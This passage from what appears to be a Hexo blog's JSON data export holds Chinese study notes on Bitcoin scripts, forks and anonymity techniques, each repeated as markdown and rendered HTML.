把信息生成为赎回脚本，便于消费者使用。\n- 赎回脚本可以进行反序列化。\n\n#### 脚本执行（一）\n![](../pic/Pasted%20image%2020240722232612.png)\n\n\n#### 执行脚本（二）\n![](../pic/Pasted%20image%2020240722232738.png)\n\n说明：展开赎回脚本的信息进行验证。\n\n## d.Proof of Burn\n![](../pic/Pasted%20image%2020240722233216.png)\n\n- return之后的代码都不会进行存储。\n-  用来销毁比特币，这个币永远不能正确验证。\n- 销毁以获取小币种的加密货币，AltCoin。\n- 进行永久数据的存储。\n- coinbase也可以进行随意的写入，但是需要有区块的记账权。","source":"_posts/08 BTC-脚本.md","raw":"---\ntitle: 08 BTC-脚本\ndate: 2024-07-22 20:20:48\ntags: \n - BTC\n - BlockChain\ncategories:\n - BlockChain\n - BTC\n---\n# 1. 交易信息\n\n### a.交易结构\n![](../pic/Pasted%20image%2020240722222013.png)\n\n\n说明：\n- locktime：生效延迟时间。\n- vin：输入信息。\n- vout：输出信息。\n- blockhash：哈希值。\n- time：交易时间。\n- blocktime：区块产生时间。\n### b.交易的输入\n![](../pic/Pasted%20image%2020240722222428.png)\n\n- txid：之前交易的哈希值。\n- vout：第几个输出结果。\n- scriptSig：输入脚本。\n\n### c.交易输出\n![](../pic/Pasted%20image%2020240722222713.png)\n\n\n- reqSigs：需要多少个签名（单/多重签名）。\n- address：输出的地址。\n\n### d.交易验证\n![](../pic/Pasted%20image%2020240722223019.png)\n\n说明：\n\n\n# 2.验证模式\n\n## a.P2PK\n![](../pic/Pasted%20image%2020240722223640.png)\n\n### 脚本执行\n![](../pic/Pasted%20image%2020240722225652.png)\n- output：指的是输出结果，里面有下转账交易的目的地址与公钥地址。\n- input：为下一个交易的输入信息，sig是对于本次交易的HASH，可以通过以上一个区块的输出的公钥进行验证这个签名的正确性。\n\n## b.P2PKH\n![](../pic/Pasted%20image%2020240722224300.png)\n\n### 脚本执行\n![](../pic/Pasted%20image%2020240722225844.png)\n说明：最常用的\n- DUP：赋值栈顶元素。\n- EQ：比较是否相等。\n- CHECKSIG：用公钥检查签名是否正确。\n\n\n## c.P2SH\n![](../pic/Pasted%20image%2020240722230237.png)\n\n### 验证\n![](../pic/Pasted%20image%2020240722230403.png)\n\n\n- 根据收款账户提供的赎回脚本，进行HASH，判断与之前提供的赎回脚本的HASH是否相等，相等则为同一个人或组织，有权花费上一个交易转入的钱。\n- 执行一遍赎回脚本，验证签名是否正确。\n\n### 实现\n\n#### 总体\n![](../pic/Pasted%20image%2020240722230911.png)\n\n#### 验证一\n![](../pic/Pasted%20image%2020240722231217.png)\n\n- 进行堆栈操作判断是否符合。\n#### 验证二\n![](../pic/Pasted%20image%2020240722231356.png)\n\n说明：\n- 反序列化。\n- 产生签名。\n- 对签名进行公钥验证。\n\n### 普通多重签名：\n![](../pic/Pasted%20image%2020240722231809.png)\n\n- 最上面的红叉子，是代码问题，多弹出一个元素。\n- 相对顺序必须相同。\n- 问题-生成交易需要在输出脚本输入公钥与最少使用的签名个数。\n- 问题-签名规则不统一，容易出现分歧。\n\n### P2SH多重签名\n![](../pic/Pasted%20image%2020240722232336.png)\n\n\n- 不用消费者输入公钥与认证规则。\n- 把信息生成为赎回脚本，便于消费者使用。\n- 赎回脚本可以进行反序列化。\n\n#### 脚本执行（一）\n![](../pic/Pasted%20image%2020240722232612.png)\n\n\n#### 执行脚本（二）\n![](../pic/Pasted%20image%2020240722232738.png)\n\n说明：展开赎回脚本的信息进行验证。\n\n## d.Proof of Burn\n![](../pic/Pasted%20image%2020240722233216.png)\n\n- return之后的代码都不会进行存储。\n-  用来销毁比特币，这个币永远不能正确验证。\n- 销毁以获取小币种的加密货币，AltCoin。\n- 进行永久数据的存储。\n- coinbase也可以进行随意的写入，但是需要有区块的记账权。","slug":"08 BTC-脚本","published":1,"updated":"2024-07-31T15:55:50.311Z","_id":"clz7mrmk0000r8wun9muh25tl","comments":1,"layout":"post","photos":[],"content":"<h1 id=\"1-交易信息\"><a href=\"#1-交易信息\" class=\"headerlink\" title=\"1. 交易信息\"></a>1. 交易信息</h1><h3 id=\"a-交易结构\"><a href=\"#a-交易结构\" class=\"headerlink\" title=\"a.交易结构\"></a>a.交易结构</h3><p><img src=\"/../pic/Pasted%20image%2020240722222013.png\"></p>\n<p>说明：</p>\n<ul>\n<li>locktime：生效延迟时间。</li>\n<li>vin：输入信息。</li>\n<li>vout：输出信息。</li>\n<li>blockhash：哈希值。</li>\n<li>time：交易时间。</li>\n<li>blocktime：区块产生时间。</li>\n</ul>\n<h3 id=\"b-交易的输入\"><a href=\"#b-交易的输入\" class=\"headerlink\" title=\"b.交易的输入\"></a>b.交易的输入</h3><p><img src=\"/../pic/Pasted%20image%2020240722222428.png\"></p>\n<ul>\n<li>txid：之前交易的哈希值。</li>\n<li>vout：第几个输出结果。</li>\n<li>scriptSig：输入脚本。</li>\n</ul>\n<h3 id=\"c-交易输出\"><a href=\"#c-交易输出\" class=\"headerlink\" title=\"c.交易输出\"></a>c.交易输出</h3><p><img src=\"/../pic/Pasted%20image%2020240722222713.png\"></p>\n<ul>\n<li>reqSigs：需要多少个签名（单&#x2F;多重签名）。</li>\n<li>address：输出的地址。</li>\n</ul>\n<h3 id=\"d-交易验证\"><a href=\"#d-交易验证\" class=\"headerlink\" title=\"d.交易验证\"></a>d.交易验证</h3><p><img src=\"/../pic/Pasted%20image%2020240722223019.png\"></p>\n<p>说明：</p>\n<h1 id=\"2-验证模式\"><a href=\"#2-验证模式\" class=\"headerlink\" title=\"2.验证模式\"></a>2.验证模式</h1><h2 id=\"a-P2PK\"><a href=\"#a-P2PK\" class=\"headerlink\" title=\"a.P2PK\"></a>a.P2PK</h2><p><img src=\"/../pic/Pasted%20image%2020240722223640.png\"></p>\n<h3 id=\"脚本执行\"><a href=\"#脚本执行\" class=\"headerlink\" title=\"脚本执行\"></a>脚本执行</h3><p><img src=\"/../pic/Pasted%20image%2020240722225652.png\"></p>\n<ul>\n<li>output：指的是输出结果，里面有下转账交易的目的地址与公钥地址。</li>\n<li>input：为下一个交易的输入信息，sig是对于本次交易的HASH，可以通过以上一个区块的输出的公钥进行验证这个签名的正确性。</li>\n</ul>\n<h2 id=\"b-P2PKH\"><a href=\"#b-P2PKH\" class=\"headerlink\" title=\"b.P2PKH\"></a>b.P2PKH</h2><p><img src=\"/../pic/Pasted%20image%2020240722224300.png\"></p>\n<h3 id=\"脚本执行-1\"><a href=\"#脚本执行-1\" class=\"headerlink\" title=\"脚本执行\"></a>脚本执行</h3><p><img src=\"/../pic/Pasted%20image%2020240722225844.png\"><br>说明：最常用的</p>\n<ul>\n<li>DUP：赋值栈顶元素。</li>\n<li>EQ：比较是否相等。</li>\n<li>CHECKSIG：用公钥检查签名是否正确。</li>\n</ul>\n<h2 id=\"c-P2SH\"><a href=\"#c-P2SH\" class=\"headerlink\" title=\"c.P2SH\"></a>c.P2SH</h2><p><img src=\"/../pic/Pasted%20image%2020240722230237.png\"></p>\n<h3 id=\"验证\"><a href=\"#验证\" class=\"headerlink\" title=\"验证\"></a>验证</h3><p><img src=\"/../pic/Pasted%20image%2020240722230403.png\"></p>\n<ul>\n<li>根据收款账户提供的赎回脚本，进行HASH，判断与之前提供的赎回脚本的HASH是否相等，相等则为同一个人或组织，有权花费上一个交易转入的钱。</li>\n<li>执行一遍赎回脚本，验证签名是否正确。</li>\n</ul>\n<h3 id=\"实现\"><a href=\"#实现\" class=\"headerlink\" title=\"实现\"></a>实现</h3><h4 id=\"总体\"><a href=\"#总体\" class=\"headerlink\" title=\"总体\"></a>总体</h4><p><img src=\"/../pic/Pasted%20image%2020240722230911.png\"></p>\n<h4 id=\"验证一\"><a href=\"#验证一\" class=\"headerlink\" title=\"验证一\"></a>验证一</h4><p><img src=\"/../pic/Pasted%20image%2020240722231217.png\"></p>\n<ul>\n<li>进行堆栈操作判断是否符合。</li>\n</ul>\n<h4 id=\"验证二\"><a href=\"#验证二\" class=\"headerlink\" title=\"验证二\"></a>验证二</h4><p><img src=\"/../pic/Pasted%20image%2020240722231356.png\"></p>\n<p>说明：</p>\n<ul>\n<li>反序列化。</li>\n<li>产生签名。</li>\n<li>对签名进行公钥验证。</li>\n</ul>\n<h3 id=\"普通多重签名：\"><a href=\"#普通多重签名：\" class=\"headerlink\" title=\"普通多重签名：\"></a>普通多重签名：</h3><p><img src=\"/../pic/Pasted%20image%2020240722231809.png\"></p>\n<ul>\n<li>最上面的红叉子，是代码问题，多弹出一个元素。</li>\n<li>相对顺序必须相同。</li>\n<li>问题-生成交易需要在输出脚本输入公钥与最少使用的签名个数。</li>\n<li>问题-签名规则不统一，容易出现分歧。</li>\n</ul>\n<h3 id=\"P2SH多重签名\"><a href=\"#P2SH多重签名\" class=\"headerlink\" title=\"P2SH多重签名\"></a>P2SH多重签名</h3><p><img src=\"/../pic/Pasted%20image%2020240722232336.png\"></p>\n<ul>\n<li>不用消费者输入公钥与认证规则。</li>\n<li>把信息生成为赎回脚本，便于消费者使用。</li>\n<li>赎回脚本可以进行反序列化。</li>\n</ul>\n<h4 id=\"脚本执行（一）\"><a href=\"#脚本执行（一）\" class=\"headerlink\" title=\"脚本执行（一）\"></a>脚本执行（一）</h4><p><img src=\"/../pic/Pasted%20image%2020240722232612.png\"></p>\n<h4 id=\"执行脚本（二）\"><a href=\"#执行脚本（二）\" class=\"headerlink\" title=\"执行脚本（二）\"></a>执行脚本（二）</h4><p><img src=\"/../pic/Pasted%20image%2020240722232738.png\"></p>\n<p>说明：展开赎回脚本的信息进行验证。</p>\n<h2 id=\"d-Proof-of-Burn\"><a href=\"#d-Proof-of-Burn\" class=\"headerlink\" title=\"d.Proof of Burn\"></a>d.Proof of Burn</h2><p><img src=\"/../pic/Pasted%20image%2020240722233216.png\"></p>\n<ul>\n<li>return之后的代码都不会进行存储。</li>\n<li>用来销毁比特币，这个币永远不能正确验证。</li>\n<li>销毁以获取小币种的加密货币，AltCoin。</li>\n<li>进行永久数据的存储。</li>\n<li>coinbase也可以进行随意的写入，但是需要有区块的记账权。</li>\n</ul>\n","excerpt":"","more":"<h1 id=\"1-交易信息\"><a href=\"#1-交易信息\" class=\"headerlink\" title=\"1. 交易信息\"></a>1. 交易信息</h1><h3 id=\"a-交易结构\"><a href=\"#a-交易结构\" class=\"headerlink\" title=\"a.交易结构\"></a>a.交易结构</h3><p><img src=\"/../pic/Pasted%20image%2020240722222013.png\"></p>\n<p>说明：</p>\n<ul>\n<li>locktime：生效延迟时间。</li>\n<li>vin：输入信息。</li>\n<li>vout：输出信息。</li>\n<li>blockhash：哈希值。</li>\n<li>time：交易时间。</li>\n<li>blocktime：区块产生时间。</li>\n</ul>\n<h3 id=\"b-交易的输入\"><a href=\"#b-交易的输入\" class=\"headerlink\" title=\"b.交易的输入\"></a>b.交易的输入</h3><p><img src=\"/../pic/Pasted%20image%2020240722222428.png\"></p>\n<ul>\n<li>txid：之前交易的哈希值。</li>\n<li>vout：第几个输出结果。</li>\n<li>scriptSig：输入脚本。</li>\n</ul>\n<h3 id=\"c-交易输出\"><a href=\"#c-交易输出\" class=\"headerlink\" title=\"c.交易输出\"></a>c.交易输出</h3><p><img src=\"/../pic/Pasted%20image%2020240722222713.png\"></p>\n<ul>\n<li>reqSigs：需要多少个签名（单&#x2F;多重签名）。</li>\n<li>address：输出的地址。</li>\n</ul>\n<h3 id=\"d-交易验证\"><a href=\"#d-交易验证\" class=\"headerlink\" title=\"d.交易验证\"></a>d.交易验证</h3><p><img src=\"/../pic/Pasted%20image%2020240722223019.png\"></p>\n<p>说明：</p>\n<h1 id=\"2-验证模式\"><a href=\"#2-验证模式\" class=\"headerlink\" title=\"2.验证模式\"></a>2.验证模式</h1><h2 id=\"a-P2PK\"><a href=\"#a-P2PK\" class=\"headerlink\" title=\"a.P2PK\"></a>a.P2PK</h2><p><img src=\"/../pic/Pasted%20image%2020240722223640.png\"></p>\n<h3 id=\"脚本执行\"><a href=\"#脚本执行\" class=\"headerlink\" title=\"脚本执行\"></a>脚本执行</h3><p><img src=\"/../pic/Pasted%20image%2020240722225652.png\"></p>\n<ul>\n<li>output：指的是输出结果，里面有下转账交易的目的地址与公钥地址。</li>\n<li>input：为下一个交易的输入信息，sig是对于本次交易的HASH，可以通过以上一个区块的输出的公钥进行验证这个签名的正确性。</li>\n</ul>\n<h2 id=\"b-P2PKH\"><a href=\"#b-P2PKH\" class=\"headerlink\" title=\"b.P2PKH\"></a>b.P2PKH</h2><p><img src=\"/../pic/Pasted%20image%2020240722224300.png\"></p>\n<h3 id=\"脚本执行-1\"><a href=\"#脚本执行-1\" class=\"headerlink\" title=\"脚本执行\"></a>脚本执行</h3><p><img src=\"/../pic/Pasted%20image%2020240722225844.png\"><br>说明：最常用的</p>\n<ul>\n<li>DUP：赋值栈顶元素。</li>\n<li>EQ：比较是否相等。</li>\n<li>CHECKSIG：用公钥检查签名是否正确。</li>\n</ul>\n<h2 id=\"c-P2SH\"><a href=\"#c-P2SH\" class=\"headerlink\" title=\"c.P2SH\"></a>c.P2SH</h2><p><img src=\"/../pic/Pasted%20image%2020240722230237.png\"></p>\n<h3 id=\"验证\"><a href=\"#验证\" class=\"headerlink\" title=\"验证\"></a>验证</h3><p><img src=\"/../pic/Pasted%20image%2020240722230403.png\"></p>\n<ul>\n<li>根据收款账户提供的赎回脚本，进行HASH，判断与之前提供的赎回脚本的HASH是否相等，相等则为同一个人或组织，有权花费上一个交易转入的钱。</li>\n<li>执行一遍赎回脚本，验证签名是否正确。</li>\n</ul>\n<h3 id=\"实现\"><a href=\"#实现\" class=\"headerlink\" title=\"实现\"></a>实现</h3><h4 id=\"总体\"><a href=\"#总体\" class=\"headerlink\" title=\"总体\"></a>总体</h4><p><img src=\"/../pic/Pasted%20image%2020240722230911.png\"></p>\n<h4 id=\"验证一\"><a href=\"#验证一\" class=\"headerlink\" title=\"验证一\"></a>验证一</h4><p><img src=\"/../pic/Pasted%20image%2020240722231217.png\"></p>\n<ul>\n<li>进行堆栈操作判断是否符合。</li>\n</ul>\n<h4 id=\"验证二\"><a href=\"#验证二\" class=\"headerlink\" title=\"验证二\"></a>验证二</h4><p><img src=\"/../pic/Pasted%20image%2020240722231356.png\"></p>\n<p>说明：</p>\n<ul>\n<li>反序列化。</li>\n<li>产生签名。</li>\n<li>对签名进行公钥验证。</li>\n</ul>\n<h3 id=\"普通多重签名：\"><a href=\"#普通多重签名：\" class=\"headerlink\" title=\"普通多重签名：\"></a>普通多重签名：</h3><p><img src=\"/../pic/Pasted%20image%2020240722231809.png\"></p>\n<ul>\n<li>最上面的红叉子，是代码问题，多弹出一个元素。</li>\n<li>相对顺序必须相同。</li>\n<li>问题-生成交易需要在输出脚本输入公钥与最少使用的签名个数。</li>\n<li>问题-签名规则不统一，容易出现分歧。</li>\n</ul>\n<h3 id=\"P2SH多重签名\"><a href=\"#P2SH多重签名\" class=\"headerlink\" title=\"P2SH多重签名\"></a>P2SH多重签名</h3><p><img src=\"/../pic/Pasted%20image%2020240722232336.png\"></p>\n<ul>\n<li>不用消费者输入公钥与认证规则。</li>\n<li>把信息生成为赎回脚本，便于消费者使用。</li>\n<li>赎回脚本可以进行反序列化。</li>\n</ul>\n<h4 id=\"脚本执行（一）\"><a href=\"#脚本执行（一）\" class=\"headerlink\" title=\"脚本执行（一）\"></a>脚本执行（一）</h4><p><img src=\"/../pic/Pasted%20image%2020240722232612.png\"></p>\n<h4 id=\"执行脚本（二）\"><a href=\"#执行脚本（二）\" class=\"headerlink\" title=\"执行脚本（二）\"></a>执行脚本（二）</h4><p><img src=\"/../pic/Pasted%20image%2020240722232738.png\"></p>\n<p>说明：展开赎回脚本的信息进行验证。</p>\n<h2 id=\"d-Proof-of-Burn\"><a href=\"#d-Proof-of-Burn\" class=\"headerlink\" title=\"d.Proof of Burn\"></a>d.Proof of Burn</h2><p><img src=\"/../pic/Pasted%20image%2020240722233216.png\"></p>\n<ul>\n<li>return之后的代码都不会进行存储。</li>\n<li>用来销毁比特币，这个币永远不能正确验证。</li>\n<li>销毁以获取小币种的加密货币，AltCoin。</li>\n<li>进行永久数据的存储。</li>\n<li>coinbase也可以进行随意的写入，但是需要有区块的记账权。</li>\n</ul>\n"},{"title":"09 BTC-分叉","date":"2024-07-24T12:20:42.000Z","_content":"# 造成原因\n\n## state fork\n\n- 对于当前区块有分歧。\n- 同时获取到合法块。\n\n### forking attack\n\n- deliberate fork\n\n## 协议分叉(protocol fork)\n\n### 硬分叉\n![](../pic/Pasted%20image%2020240723233030.png)\n\n-  对于区块链的基本信息的修改，接受与不接受的人之间的分叉。\n- 接受的人认为修改过的为合法区块，未修改为非法区块。\n- 典型的为block size limit\n- 永久性分叉。\n- 加一个chainID作为链的标识。\n\n### 软分叉（sofy fork）\n![](../pic/Pasted%20image%2020240723233706.png)\n- 分叉的结果是只有一条链是合法的。\n- 更新新版本的节点挖的区块可以被识别与认证。\n- 旧版本的节点挖出来的区块不会被新节点承认，即无法加入最长合法连中。\n- 旧认新，新不认旧。\n\n#### coinbase\n\n- 挖矿难度：extra nonce + 4bytes\n- extra nonce：前8bit用来作为修改target的数据。\n- extra nonce 后面：作为UTXO的根哈希。\n\n#### UTXO\n\n- 改成默克尔树。\n\n#### 默克尔树\n\n- 验证交易是否在区块内。","source":"_posts/09 BTC-分叉.md","raw":"---\ntitle: 09 BTC-分叉\ndate: 2024-07-24 20:20:42\ntags: \n - BTC\n - BlockChain\ncategories:\n - BlockChain\n - BTC\n---\n# 造成原因\n\n## state fork\n\n- 对于当前区块有分歧。\n- 同时获取到合法块。\n\n### forking attack\n\n- deliberate fork\n\n## 协议分叉(protocol fork)\n\n### 硬分叉\n![](../pic/Pasted%20image%2020240723233030.png)\n\n-  对于区块链的基本信息的修改，接受与不接受的人之间的分叉。\n- 接受的人认为修改过的为合法区块，未修改为非法区块。\n- 典型的为block size limit\n- 永久性分叉。\n- 加一个chainID作为链的标识。\n\n### 软分叉（sofy fork）\n![](../pic/Pasted%20image%2020240723233706.png)\n- 分叉的结果是只有一条链是合法的。\n- 更新新版本的节点挖的区块可以被识别与认证。\n- 旧版本的节点挖出来的区块不会被新节点承认，即无法加入最长合法连中。\n- 旧认新，新不认旧。\n\n#### coinbase\n\n- 挖矿难度：extra nonce + 4bytes\n- extra nonce：前8bit用来作为修改target的数据。\n- extra nonce 后面：作为UTXO的根哈希。\n\n#### UTXO\n\n- 改成默克尔树。\n\n#### 默克尔树\n\n- 验证交易是否在区块内。","slug":"09 BTC-分叉","published":1,"updated":"2024-07-31T15:53:17.089Z","_id":"clz7mrmk1000t8wunf78x90u1","comments":1,"layout":"post","photos":[],"content":"<h1 id=\"造成原因\"><a href=\"#造成原因\" class=\"headerlink\" title=\"造成原因\"></a>造成原因</h1><h2 id=\"state-fork\"><a href=\"#state-fork\" class=\"headerlink\" title=\"state fork\"></a>state fork</h2><ul>\n<li>对于当前区块有分歧。</li>\n<li>同时获取到合法块。</li>\n</ul>\n<h3 id=\"forking-attack\"><a href=\"#forking-attack\" class=\"headerlink\" title=\"forking attack\"></a>forking attack</h3><ul>\n<li>deliberate fork</li>\n</ul>\n<h2 id=\"协议分叉-protocol-fork\"><a href=\"#协议分叉-protocol-fork\" class=\"headerlink\" title=\"协议分叉(protocol fork)\"></a>协议分叉(protocol fork)</h2><h3 id=\"硬分叉\"><a href=\"#硬分叉\" class=\"headerlink\" title=\"硬分叉\"></a>硬分叉</h3><p><img src=\"/../pic/Pasted%20image%2020240723233030.png\"></p>\n<ul>\n<li>对于区块链的基本信息的修改，接受与不接受的人之间的分叉。</li>\n<li>接受的人认为修改过的为合法区块，未修改为非法区块。</li>\n<li>典型的为block size limit</li>\n<li>永久性分叉。</li>\n<li>加一个chainID作为链的标识。</li>\n</ul>\n<h3 id=\"软分叉（sofy-fork）\"><a href=\"#软分叉（sofy-fork）\" class=\"headerlink\" title=\"软分叉（sofy fork）\"></a>软分叉（sofy fork）</h3><p><img src=\"/../pic/Pasted%20image%2020240723233706.png\"></p>\n<ul>\n<li>分叉的结果是只有一条链是合法的。</li>\n<li>更新新版本的节点挖的区块可以被识别与认证。</li>\n<li>旧版本的节点挖出来的区块不会被新节点承认，即无法加入最长合法连中。</li>\n<li>旧认新，新不认旧。</li>\n</ul>\n<h4 id=\"coinbase\"><a href=\"#coinbase\" class=\"headerlink\" title=\"coinbase\"></a>coinbase</h4><ul>\n<li>挖矿难度：extra nonce + 4bytes</li>\n<li>extra nonce：前8bit用来作为修改target的数据。</li>\n<li>extra nonce 后面：作为UTXO的根哈希。</li>\n</ul>\n<h4 id=\"UTXO\"><a href=\"#UTXO\" class=\"headerlink\" title=\"UTXO\"></a>UTXO</h4><ul>\n<li>改成默克尔树。</li>\n</ul>\n<h4 id=\"默克尔树\"><a href=\"#默克尔树\" class=\"headerlink\" title=\"默克尔树\"></a>默克尔树</h4><ul>\n<li>验证交易是否在区块内。</li>\n</ul>\n","excerpt":"","more":"<h1 id=\"造成原因\"><a href=\"#造成原因\" class=\"headerlink\" title=\"造成原因\"></a>造成原因</h1><h2 id=\"state-fork\"><a href=\"#state-fork\" class=\"headerlink\" title=\"state fork\"></a>state fork</h2><ul>\n<li>对于当前区块有分歧。</li>\n<li>同时获取到合法块。</li>\n</ul>\n<h3 id=\"forking-attack\"><a href=\"#forking-attack\" class=\"headerlink\" title=\"forking attack\"></a>forking attack</h3><ul>\n<li>deliberate fork</li>\n</ul>\n<h2 id=\"协议分叉-protocol-fork\"><a href=\"#协议分叉-protocol-fork\" class=\"headerlink\" title=\"协议分叉(protocol fork)\"></a>协议分叉(protocol fork)</h2><h3 id=\"硬分叉\"><a href=\"#硬分叉\" class=\"headerlink\" title=\"硬分叉\"></a>硬分叉</h3><p><img src=\"/../pic/Pasted%20image%2020240723233030.png\"></p>\n<ul>\n<li>对于区块链的基本信息的修改，接受与不接受的人之间的分叉。</li>\n<li>接受的人认为修改过的为合法区块，未修改为非法区块。</li>\n<li>典型的为block size limit</li>\n<li>永久性分叉。</li>\n<li>加一个chainID作为链的标识。</li>\n</ul>\n<h3 id=\"软分叉（sofy-fork）\"><a href=\"#软分叉（sofy-fork）\" class=\"headerlink\" title=\"软分叉（sofy fork）\"></a>软分叉（sofy fork）</h3><p><img src=\"/../pic/Pasted%20image%2020240723233706.png\"></p>\n<ul>\n<li>分叉的结果是只有一条链是合法的。</li>\n<li>更新新版本的节点挖的区块可以被识别与认证。</li>\n<li>旧版本的节点挖出来的区块不会被新节点承认，即无法加入最长合法连中。</li>\n<li>旧认新，新不认旧。</li>\n</ul>\n<h4 id=\"coinbase\"><a href=\"#coinbase\" class=\"headerlink\" title=\"coinbase\"></a>coinbase</h4><ul>\n<li>挖矿难度：extra nonce + 4bytes</li>\n<li>extra nonce：前8bit用来作为修改target的数据。</li>\n<li>extra nonce 后面：作为UTXO的根哈希。</li>\n</ul>\n<h4 id=\"UTXO\"><a href=\"#UTXO\" class=\"headerlink\" title=\"UTXO\"></a>UTXO</h4><ul>\n<li>改成默克尔树。</li>\n</ul>\n<h4 id=\"默克尔树\"><a href=\"#默克尔树\" class=\"headerlink\" title=\"默克尔树\"></a>默克尔树</h4><ul>\n<li>验证交易是否在区块内。</li>\n</ul>\n"},{"title":"11 BTC-匿名性","date":"2024-07-24T12:20:44.000Z","_content":"# 匿名性\n\nBTC就是化名。\n\n# 破坏匿名性的可能\n## 账户关联\n\n交易时，需要一个找零钱的地址，是输入用户的账户。\n\n钱包交易时\n\n## 实体世界联系\n\n交集反推，可以把账户与个人联系起来。\n\n\n# 提高匿名性方式\n\n## 应用层\n\n- 破坏匿名性原因：账户交易集中\n- coin mixing：混合币，没有信誉度高的机构。\n- 在线钱包可能或有币混合的性质。\n- 交易所不泄露交易记录可以。\n- \n## 网络层\n\n- tor\n- 多路径转发\n\n# 零知识证明\n\n## 概念\n![](../pic/Pasted%20image%2020240724182711.png)\n\n\n## 同态隐藏（数学基础）\n![](../pic/Pasted%20image%2020240724182851.png)\n\n\n- 无输入碰撞，唯一对应。\n- 加密函数不可逆。\n- 同台运算。\n- x与y进行随机化处理，使得x与y的运算结果不变。\n\n# 盲签名\n![](../pic/Pasted%20image%2020240724183744.png)\n\n\n- 2、3 步的serialnum为明文。\n\n# 零币与零钞\n![](../pic/Pasted%20image%2020240724183837.png)\n\n\n- 随机源必须及时销毁。\n- 还是要与实体交易还是容易泄露匿名性。\n","source":"_posts/11 BTC-匿名性.md","raw":"---\ntitle: 11 BTC-匿名性\ndate: 2024-07-24 20:20:44\ntags: \n - BTC\n - BlockChain\ncategories:\n - BlockChain\n - BTC\n---\n# 匿名性\n\nBTC就是化名。\n\n# 破坏匿名性的可能\n## 账户关联\n\n交易时，需要一个找零钱的地址，是输入用户的账户。\n\n钱包交易时\n\n## 实体世界联系\n\n交集反推，可以把账户与个人联系起来。\n\n\n# 提高匿名性方式\n\n## 应用层\n\n- 破坏匿名性原因：账户交易集中\n- coin mixing：混合币，没有信誉度高的机构。\n- 在线钱包可能或有币混合的性质。\n- 交易所不泄露交易记录可以。\n- \n## 网络层\n\n- tor\n- 多路径转发\n\n# 零知识证明\n\n## 概念\n![](../pic/Pasted%20image%2020240724182711.png)\n\n\n## 同态隐藏（数学基础）\n![](../pic/Pasted%20image%2020240724182851.png)\n\n\n- 无输入碰撞，唯一对应。\n- 加密函数不可逆。\n- 同台运算。\n- x与y进行随机化处理，使得x与y的运算结果不变。\n\n# 盲签名\n![](../pic/Pasted%20image%2020240724183744.png)\n\n\n- 2、3 步的serialnum为明文。\n\n# 零币与零钞\n![](../pic/Pasted%20image%2020240724183837.png)\n\n\n- 随机源必须及时销毁。\n- 还是要与实体交易还是容易泄露匿名性。\n","slug":"11 BTC-匿名性","published":1,"updated":"2024-08-01T16:19:45.487Z","_id":"clz7mrmk2000y8wun9vt7bvp7","comments":1,"layout":"post","photos":[],"content":"<h1 id=\"匿名性\"><a href=\"#匿名性\" class=\"headerlink\" title=\"匿名性\"></a>匿名性</h1><p>BTC就是化名。</p>\n<h1 id=\"破坏匿名性的可能\"><a href=\"#破坏匿名性的可能\" class=\"headerlink\" title=\"破坏匿名性的可能\"></a>破坏匿名性的可能</h1><h2 id=\"账户关联\"><a href=\"#账户关联\" class=\"headerlink\" title=\"账户关联\"></a>账户关联</h2><p>交易时，需要一个找零钱的地址，是输入用户的账户。</p>\n<p>钱包交易时</p>\n<h2 id=\"实体世界联系\"><a href=\"#实体世界联系\" class=\"headerlink\" title=\"实体世界联系\"></a>实体世界联系</h2><p>交集反推，可以把账户与个人联系起来。</p>\n<h1 id=\"提高匿名性方式\"><a href=\"#提高匿名性方式\" class=\"headerlink\" title=\"提高匿名性方式\"></a>提高匿名性方式</h1><h2 id=\"应用层\"><a href=\"#应用层\" class=\"headerlink\" title=\"应用层\"></a>应用层</h2><ul>\n<li>破坏匿名性原因：账户交易集中</li>\n<li>coin mixing：混合币，没有信誉度高的机构。</li>\n<li>在线钱包可能或有币混合的性质。</li>\n<li>交易所不泄露交易记录可以。</li>\n<li></li>\n</ul>\n<h2 id=\"网络层\"><a href=\"#网络层\" class=\"headerlink\" title=\"网络层\"></a>网络层</h2><ul>\n<li>tor</li>\n<li>多路径转发</li>\n</ul>\n<h1 id=\"零知识证明\"><a href=\"#零知识证明\" class=\"headerlink\" title=\"零知识证明\"></a>零知识证明</h1><h2 id=\"概念\"><a href=\"#概念\" class=\"headerlink\" title=\"概念\"></a>概念</h2><p><img src=\"/../pic/Pasted%20image%2020240724182711.png\"></p>\n<h2 id=\"同态隐藏（数学基础）\"><a href=\"#同态隐藏（数学基础）\" class=\"headerlink\" title=\"同态隐藏（数学基础）\"></a>同态隐藏（数学基础）</h2><p><img src=\"/../pic/Pasted%20image%2020240724182851.png\"></p>\n<ul>\n<li>无输入碰撞，唯一对应。</li>\n<li>加密函数不可逆。</li>\n<li>同台运算。</li>\n<li>x与y进行随机化处理，使得x与y的运算结果不变。</li>\n</ul>\n<h1 id=\"盲签名\"><a href=\"#盲签名\" class=\"headerlink\" title=\"盲签名\"></a>盲签名</h1><p><img src=\"/../pic/Pasted%20image%2020240724183744.png\"></p>\n<ul>\n<li>2、3 步的serialnum为明文。</li>\n</ul>\n<h1 id=\"零币与零钞\"><a href=\"#零币与零钞\" class=\"headerlink\" title=\"零币与零钞\"></a>零币与零钞</h1><p><img src=\"/../pic/Pasted%20image%2020240724183837.png\"></p>\n<ul>\n<li>随机源必须及时销毁。</li>\n<li>还是要与实体交易还是容易泄露匿名性。</li>\n</ul>\n","excerpt":"","more":"<h1 id=\"匿名性\"><a href=\"#匿名性\" class=\"headerlink\" title=\"匿名性\"></a>匿名性</h1><p>BTC就是化名。</p>\n<h1 id=\"破坏匿名性的可能\"><a href=\"#破坏匿名性的可能\" class=\"headerlink\" title=\"破坏匿名性的可能\"></a>破坏匿名性的可能</h1><h2 id=\"账户关联\"><a href=\"#账户关联\" class=\"headerlink\" title=\"账户关联\"></a>账户关联</h2><p>交易时，需要一个找零钱的地址，是输入用户的账户。</p>\n<p>钱包交易时</p>\n<h2 id=\"实体世界联系\"><a href=\"#实体世界联系\" class=\"headerlink\" title=\"实体世界联系\"></a>实体世界联系</h2><p>交集反推，可以把账户与个人联系起来。</p>\n<h1 id=\"提高匿名性方式\"><a href=\"#提高匿名性方式\" class=\"headerlink\" title=\"提高匿名性方式\"></a>提高匿名性方式</h1><h2 id=\"应用层\"><a href=\"#应用层\" class=\"headerlink\" title=\"应用层\"></a>应用层</h2><ul>\n<li>破坏匿名性原因：账户交易集中</li>\n<li>coin mixing：混合币，没有信誉度高的机构。</li>\n<li>在线钱包可能或有币混合的性质。</li>\n<li>交易所不泄露交易记录可以。</li>\n<li></li>\n</ul>\n<h2 id=\"网络层\"><a href=\"#网络层\" 